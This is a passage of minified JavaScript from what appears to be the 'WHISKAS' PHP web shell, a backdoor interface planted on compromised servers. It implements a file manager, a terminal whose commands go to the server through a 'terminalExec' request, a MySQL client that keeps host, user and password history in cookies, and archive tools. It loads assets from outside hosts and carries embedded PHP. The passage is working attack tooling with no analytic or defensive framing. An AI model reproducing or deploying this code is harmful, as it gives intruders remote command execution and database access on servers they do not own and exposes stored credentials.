l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");WHISKASMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{WHISKAS2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),WHISKASMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function WHISKASRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function WHISKASLogOut(){WHISKASRemoveCookie("WHISKASUser"),WHISKASRemoveCookie("WHISKASPass"),location.reload()}var WHISKASAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://hcklst.pages.dev/check-mark.png"},error:{class:"alert-error",icon:"https://hcklst.pages.dev/warning_icon.png"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function WHISKASShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new WHISKASAlertBox("#alert-area",r).show(e)}function WHISKASSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(WHISKAS_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(WHISKAS_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(WHISKAS_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+WHISKAS_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <span opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div><div class="sql-newtab" onclick="WHISKAS_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#39FF14;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),WHISKASShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&WHISKASUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),WHISKAS_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(WHISKAS_can_add_opt){WHISKAS_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Whiskas Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <span opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'WHISKASBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'WHISKASBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),WHISKASShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&WHISKASUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'WHISKASBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'WHISKASBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function WHISKASBeforeDoAction(e){WHISKAS_before_do_action_id=e}function WHISKASLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function WHISKASAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_WHISKAS_AJAX_.hasOwnProperty(t)&&_WHISKAS_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,WHISKAS_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),WHISKASFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),WHISKASUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),WHISKASUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;WHISKAS_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),WHISKASUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),WHISKASUpdateOptionsBadge("editor")}function WHISKASUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function WHISKASOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(191 255 184)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"WHISKASTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="WHISKASExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#ffffff;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#000000;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #F8F8FF;padding-right:35px;" onkeyup="WHISKASWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #F8F8FF;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #F8F8FF;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="WHISKASExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #ffffff;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="https://storage.dk-only.site/shell-assest/dk-profile.png"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <span term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="WHISKASOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#39FF14;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",WHISKASTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=WHISKASGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function WHISKASTerminalSetColorAndSize(e){var t=getCookie("WHISKAS-terminal-color"),a=getCookie("WHISKAS-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function WHISKASTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("WHISKAS-terminal-color",e.value,2012)}function WHISKASGetTerminalHistory(e){var t=getCookie("WHISKAS-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("WHISKAS-terminal-fontsize",l,2012)}function WHISKASWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=WHISKASGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=WHISKASGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("WHISKAS-terminal-history","",2012)}function WHISKASAceToFullscreen(e){var t=e.getAttribute("ace_id");WHISKAS_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return WHISKAS_ace_editors.eval[t].getValue()}function WHISKASOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+WHISKASb64("open_archive_dir")+"&c="+WHISKASb64(c_)+"&WHISKAS1="+WHISKASb64(t)+"&WHISKAS2="+WHISKASb64(i)+"&ajax="+WHISKASb64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="WHISKASOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function WHISKASDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),WHISKASConnectionHistoryUpdate(e)}function WHISKASConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("WHISKAS_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function WHISKASShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("WHISKAS_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'WHISKASConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'WHISKASDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function WHISKASConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("WHISKAS_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("WHISKAS_connection_hist",btoa(JSON.stringify(a)),2012)}function WHISKASExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");WHISKASloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+WHISKASb64("terminalExec")+"&c="+WHISKASb64(l)+"&WHISKAS1="+WHISKASb64(a)+"&ajax="+WHISKASb64("true");if(_Ajax(d.URL,r,function(e,t){WHISKASloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),WHISKASShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&WHISKASUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=WHISKASGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("WHISKAS-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+WHISKAS_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function WHISKASColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function WHISKASgetFlags(){data="a="+WHISKASb64("get_flags")+"&c="+WHISKASb64(c_)+"&ajax="+WHISKASb64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function WHISKASCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(WHISKAS_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function WHISKASFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),WHISKASSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var 